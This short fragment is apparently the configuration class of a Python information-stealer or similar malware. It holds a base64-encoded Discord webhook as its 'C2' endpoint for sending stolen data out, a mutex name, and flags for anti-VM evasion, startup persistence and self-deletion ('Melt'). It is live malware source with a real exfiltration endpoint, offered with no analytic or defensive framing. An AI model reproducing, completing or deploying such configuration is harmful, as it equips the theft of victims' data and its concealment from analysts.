...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNTI3MTAzMDE1NTMxNzI4OS9OYXNxN243TkFleTVCSVFhR2Q2UEwxRlFFanBqdUpfTzRId1NvU2xieHJrSGtEMW5iTHpCVHBWWVJKRUZaTE4zT29Ceg==').decode())
    Mutex = base64.b64decode('ZHljWHk2enozdHFSUndxRg==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
